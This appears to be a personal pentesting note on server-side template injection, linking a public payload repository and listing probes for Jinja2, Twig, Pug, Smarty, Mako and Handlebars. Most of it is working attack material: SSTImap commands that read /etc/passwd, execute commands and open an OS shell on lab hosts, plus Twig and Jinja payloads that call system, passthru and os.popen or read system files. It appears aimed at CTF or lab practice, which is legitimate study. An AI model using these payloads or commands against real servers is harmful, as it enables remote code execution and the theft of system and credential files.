#php #nodejs #python
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

1. **Jinja2 (python)/Twig (PHP)** - `{{7*'7'}}`
2. **Jade/Pug** (Node)
	* `#{7 * 7}`
3. Smarty (PHP) - `{'Hello'|upper}`
4. Pug (node)
	* `#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}`
5. Make (python)
	* ${7 * 7}
6. handlebars (node)
	* `{{7+7}}`

##### Automation
```bash
git clone https://github.com/vladko312/SSTImap.git

python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='

# Download remote file
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'

# Execute remote command
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id

# OS shell
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

#### Twig
[[twig]]
```twig
{{['id',""]|sort('passthru')}}

{{ _self }}

{{ "/etc/passwd"|file_excerpt(1,-1) }}

{{ ['id'] | filter('system') }}
```

#### Jinja
[[jinja]]
```jinja2
{{ config.items() }}

{{ self.__init__.__globals__.__builtins__ }}

{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
```
##### Identification guide
![[identify SSTI.png]]